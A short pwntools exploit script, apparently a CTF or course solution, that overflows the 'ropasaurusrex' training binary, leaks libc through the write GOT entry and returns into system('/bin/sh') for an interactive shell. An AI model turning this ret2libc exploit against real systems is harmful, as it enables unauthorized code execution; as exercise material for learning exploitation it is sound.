#! /usr/bin/python3
import pwn
import time



pwn.context.terminal = ['tmux', 'split-window', '-h'] #(si può usare screen)
#r=pwn.remote("bin.training.offdef.it",2014)
r = pwn.process("./ropasaurusrex")
pwn.gdb.attach(r, '''
b * 0804841b
''' )
libc = pwn.ELF("./libc-2.35.so")
print("libc address of system: ", hex(libc.symbols["system"]))
print("got address of write:", hex(pwn.ELF("./ropasaurusrex").got["write"]))
pwn.context.log_level="DEBUG"
pwn.context.arch = "amd64"
write = pwn.ELF("./ropasaurusrex").sym["write"]
main = 0x804841d
#print("posizione srip:")
#print(pwn.cyclic_find("kaab"))
got_write=pwn.packing.p32(pwn.ELF("./ropasaurusrex").got["write"], endian="little", sign="unsigned")
exploit=140*b'A'+ pwn.packing.p32(write) + pwn.packing.p32(main)+pwn.packing.p32(1)+got_write+pwn.packing.p32(4)
r.send(exploit)
libc_write=r.recv()
base_address_libc=pwn.packing.u32(libc_write,sign="unsigned",endian="little")-libc.sym["write"]
system=base_address_libc+libc.symbols["system"]
binsh=0x001bd0f0+5+base_address_libc
exploit=140*b'A'+pwn.packing.p32(system,sign="unsigned",endian="little")+pwn.packing.p32(255)+pwn.packing.p32(binsh)
r.send(exploit)
print("base_address_libc:",hex(base_address_libc))
r.interactive()
